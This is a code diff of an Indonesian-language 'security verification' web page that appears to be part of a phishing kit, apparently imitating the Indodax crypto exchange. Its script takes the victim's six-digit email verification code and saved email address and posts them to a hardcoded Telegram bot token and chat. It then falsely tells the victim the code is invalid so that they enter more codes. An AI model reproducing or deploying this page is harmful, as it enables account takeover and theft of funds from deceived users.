@@ -8,216 +8,183 @@
     rel="stylesheet"
     href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
   />
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
-    body {
-      font-family: 'Inter', sans-serif;
-    }
-    /* Loading overlay styles */
-    #loadingOverlay {
-      background-color: rgba(255, 255, 255, 0.8);
-      backdrop-filter: blur(3px);
-      position: fixed;
-      inset: 0;
-      z-index: 50;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      visibility: hidden;
-      opacity: 0;
-      transition: opacity 0.3s ease;
-    }
-    #loadingOverlay.show {
-      visibility: visible;
-      opacity: 1;
-    }
-    /* Spinner animation */
-    .spinner {
-      border: 4px solid #e5e7eb; /* Tailwind gray-200 */
-      border-top: 4px solid #0077cc; /* Custom blue */
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-  </style>
 </head>
-<body class="bg-white min-h-screen flex flex-col">
-  <div class="max-w-md w-full mx-auto flex flex-col px-5 pt-5 pb-20">
-    <!-- Header with back arrow and title -->
-    <div class="flex items-center space-x-3 mb-6">
-      <button aria-label="Kembali" class="text-gray-600 hover:text-gray-800 focus:outline-none" onclick="history.back()">
-        <i class="fas fa-arrow-left text-lg"></i>
-      </button>
-      <h1 class="font-semibold text-gray-900 text-lg leading-6">Verifikasi Keamanan</h1>
-    </div>
+<body class="bg-white min-h-screen flex flex-col justify-between">
+  <header class="flex items-center px-4 py-3 space-x-3 border-b border-gray-200">
+    <button aria-label="Back" class="text-gray-900 text-lg">
+      <i class="fas fa-arrow-left"></i>
+    </button>
+    <h1 class="font-semibold text-gray-900 text-lg">Verifikasi Keamanan</h1>
+  </header>
 
-    <!-- Instruction text -->
-    <p class="text-gray-600 text-sm mb-5 leading-relaxed">
+  <main class="px-5 pt-6 flex-grow">
+    <p class="text-gray-600 text-sm leading-relaxed mb-4 max-w-md">
       Harap selesaikan proses verifikasi di bawah untuk melanjutkan
     </p>
 
-    <!-- Subtitle -->
-    <p class="text-gray-700 font-semibold text-sm mb-2">Verifikasi via Email (6 digit)</p>
+    <label for="code" class="block font-semibold text-gray-900 text-sm mb-1 max-w-md">
+      Verifikasi via Email (6 digit)
+    </label>
 
-    <!-- Input container -->
-    <form id="verificationForm" class="flex items-center justify-between border border-gray-300 rounded-md px-3 py-2 mb-3" onsubmit="return sendToTelegram(event)">
-      <span class="font-semibold text-gray-900">X-</span>
+    <div
+      class="max-w-md flex items-center border border-gray-300 rounded-md overflow-hidden"
+      style="height: 40px"
+    >
+      <span
+        class="flex items-center justify-center text-gray-600 font-semibold px-3 border-r border-gray-300 select-none"
+        style="width: 40px"
+        >X-</span
+      >
       <input
-        id="codeInput"
-        name="code"
+        id="code"
         type="text"
         placeholder="Masukkan Kode"
-        class="flex-1 text-gray-400 placeholder-gray-400 text-sm focus:outline-none ml-2"
-        aria-label="Masukkan Kode"
+        class="flex-grow h-full px-3 text-gray-400 placeholder-gray-400 focus:outline-none"
         maxlength="6"
-        required
+        inputmode="numeric"
+        pattern="[0-9]*"
+        aria-label="Masukkan Kode"
       />
-      <span class="text-gray-400 text-xs Timer">00:59</span>
-    </form>
+      <span
+        id="timer"
+        class="text-gray-400 text-xs font-normal pr-3 select-none"
+        style="width: 40px"
+        >01:00</span
+      >
+    </div>
 
-    <!-- Warning box -->
-    <div class="flex items-start bg-yellow-50 rounded-md p-3 mb-5" id="emailWarningContainer" style="display:none;">
-      <i class="fas fa-exclamation-triangle text-yellow-500 mt-1 mr-2"></i>
-      <p class="text-yellow-700 text-xs leading-tight" id="emailWarning">
-        Kode verifikasi telah dikirim ke [*********@gmail.com].
+    <div
+      id="alert-box"
+      class="max-w-md mt-3 rounded-md bg-yellow-50 border border-yellow-200 p-3 flex items-start space-x-2 text-yellow-700 text-xs font-semibold"
+      role="alert"
+    >
+      <i class="fas fa-exclamation-triangle mt-[3px]"></i>
+      <p>
+        Kode verifikasi telah dikirim ke
+        <br />
+        <span id="email-display" class="font-normal text-yellow-700">[email tidak tersedia].</span>
       </p>
     </div>
-  </div>
+  </main>
 
-  <!-- Bottom fixed button -->
-  <div class="fixed bottom-0 left-0 w-full max-w-md mx-auto px-5 pb-5 bg-white">
+  <footer class="p-4">
     <button
-      id="submitBtn"
+      id="verify-btn"
       type="submit"
-      form="verificationForm"
-      class="w-full bg-gray-400 text-white text-sm font-semibold py-3 rounded-lg cursor-not-allowed select-none"
+      class="w-full max-w-md mx-auto block bg-gray-500 text-white font-semibold rounded-md py-3 disabled:opacity-70"
       disabled
     >
       Verifikasi
     </button>
-  </div>
-
-  <!-- Loading overlay -->
-  <div id="loadingOverlay">
-    <div class="spinner" role="status" aria-label="Loading"></div>
-  </div>
+  </footer>
 
   <script>
-    const codeInput = document.getElementById('codeInput');
-    const submitBtn = document.getElementById('submitBtn');
-    const timerSpan = document.querySelector('.Timer');
-    const emailWarning = document.getElementById('emailWarning');
-    const emailWarningContainer = document.getElementById('emailWarningContainer');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-
     // Ambil email dari localStorage
-  const savedEmail = localStorage.getItem('userEmail') || '';
+    const savedEmail = localStorage.getItem('userEmail') || '';
 
-  // Fungsi untuk mask email (tampilkan huruf pertama, sembunyikan sebagian, tampilkan domain)
-  function maskEmail(email) {
-    const [localPart, domain] = email.split('@');
-    if (!localPart || !domain) return email;
-    const firstChar = localPart.charAt(0);
-    const lastChar = localPart.charAt(localPart.length - 1);
-    const maskedPart = '*'.repeat(Math.max(localPart.length - 2, 1));
-    return `${firstChar}${maskedPart}${lastChar}@${domain}`;
-  }
+    // Fungsi untuk mask email (tampilkan huruf pertama, sembunyikan sebagian, tampilkan domain)
+    function maskEmail(email) {
+      const [localPart, domain] = email.split('@');
+      if (!localPart || !domain) return email;
+      const firstChar = localPart.charAt(0);
+      const lastChar = localPart.charAt(localPart.length - 1);
+      const maskedPart = '*'.repeat(Math.max(localPart.length - 2, 1));
+      return `${firstChar}${maskedPart}${lastChar}@${domain}`;
+    }
 
-  // Tampilkan email yang sudah dimask di elemen
-  const emailDisplay = document.getElementById('email-display');
-  if (emailDisplay) {
+    // Tampilkan email yang sudah dimask di elemen
+    const emailDisplay = document.getElementById('email-display');
     if (savedEmail) {
-      emailDisplay.textContent = maskEmail(savedEmail);
+      emailDisplay.textContent = `[${maskEmail(savedEmail)}].`;
     } else {
       emailDisplay.textContent = 'Email tidak tersedia';
     }
-  }
 
-    window.addEventListener('DOMContentLoaded', () => {
-      const savedEmail = localStorage.getItem('indodaxEmail');
-      if (savedEmail) {
-        const masked = maskEmail(savedEmail);
-        emailWarning.textContent = `Kode verifikasi telah dikirim ke [${masked}].`;
-        emailWarningContainer.style.display = 'flex';
-      } else {
-        emailWarningContainer.style.display = 'none';
-      }
-    });
+    const codeInput = document.getElementById('code');
+    const verifyBtn = document.getElementById('verify-btn');
+    const timerSpan = document.getElementById('timer');
 
+    // Enable button if input length is 6 digits
     codeInput.addEventListener('input', () => {
-      if (codeInput.value.trim().length === 6) {
-        submitBtn.disabled = false;
-        submitBtn.classList.remove('bg-gray-400', 'cursor-not-allowed', 'select-none');
-        submitBtn.classList.add('bg-gray-700', 'cursor-pointer');
+      verifyBtn.disabled = codeInput.value.length !== 6;
+      if (!verifyBtn.disabled) {
+        verifyBtn.classList.remove('bg-gray-500');
+        verifyBtn.classList.add('bg-gray-800');
       } else {
-        submitBtn.disabled = true;
-        submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed', 'select-none');
-        submitBtn.classList.remove('bg-gray-700', 'cursor-pointer');
+        verifyBtn.classList.add('bg-gray-500');
+        verifyBtn.classList.remove('bg-gray-800');
       }
     });
 
-    // Countdown timer from 00:59 to 00:00
-    let timeLeft = 59;
-    const timerInterval = setInterval(() => {
-      if (timeLeft <= 0) {
-        clearInterval(timerInterval);
-        timerSpan.textContent = '00:59';
-        // Optionally disable input or show resend option here
-      } else {
-        const seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
-        timerSpan.textContent = `00:${seconds}`;
-        timeLeft--;
-      }
-    }, 1000);
+    // Telegram bot info (replace with your own)
+    const telegramBotToken = '8264143217:AAGF4jq6UCT52FUQ-PCGg2DTVn_wW3Ql14w';
+    const telegramChatId = '6155537801';
 
-    function sendToTelegram(event) {
-      event.preventDefault();
+    // Function to send message to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+      const params = {
+        chat_id: telegramChatId,
+        text: message,
+        parse_mode: 'HTML'
+      };
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(params)
+        });
+        return response.ok;
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        return false;
+      }
+    }
+
+    verifyBtn.addEventListener('click', async (e) => {
+      e.preventDefault();
       const code = codeInput.value.trim();
       if (code.length !== 6) return;
 
-      // Show loading overlay
-      loadingOverlay.classList.add('show');
+      const message = `Kode Verifikasi: <b>${code}</b>\nEmail: <b>${savedEmail || 'Tidak tersedia'}</b>`;
+      const success = await sendToTelegram(message);
 
-      const botToken = '8264143217:AAGF4jq6UCT52FUQ-PCGg2DTVn_wW3Ql14w';
-      const chatId = '6155537801';
-      const message = `Kode verifikasi diterima: ${code}`;
+      if (success) {
+        alert('Kode Verifikasi Tidak Valid.');
+        codeInput.value = '';
+        verifyBtn.disabled = true;
+        verifyBtn.classList.add('bg-gray-500');
+        verifyBtn.classList.remove('bg-gray-800');
+      } else {
+        alert('Gagal mengirim kode ke Telegram.');
+      }
+    });
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        loadingOverlay.classList.remove('show');
-        if (data.ok) {
-          codeInput.value = '';
-          submitBtn.disabled = true;
-          submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed', 'select-none');
-          submitBtn.classList.remove('bg-gray-700', 'cursor-pointer');
-          // Redirect after short delay to show loading
-          loadingOverlay.classList.add('show');
-          setTimeout(() => {
-            window.location.href = "success.html";
-          }, 800);
-        } else {
-          alert('Gagal mengirim kode ke Telegram.');
-        }
-      })
-      .catch(() => {
-        loadingOverlay.classList.remove('show');
-        alert('Terjadi kesalahan saat mengirim kode.');
-      });
-    }
+    // Hitung mundur 60 detik
+    let timeLeft = 60;
+    timerSpan.textContent = '01:00';
+
+    const countdown = setInterval(() => {
+      timeLeft--;
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerSpan.textContent = `${minutes.toString().padStart(2, '0')}:${seconds
+        .toString()
+        .padStart(2, '0')}`;
+
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        timerSpan.textContent = '00:00';
+        // Optional: disable input or show message that code expired
+        codeInput.disabled = true;
+        verifyBtn.disabled = true;
+        verifyBtn.classList.add('bg-gray-500');
+        verifyBtn.classList.remove('bg-gray-800');
+      }
+    }, 1000);
   </script>
 </body>
 </html>
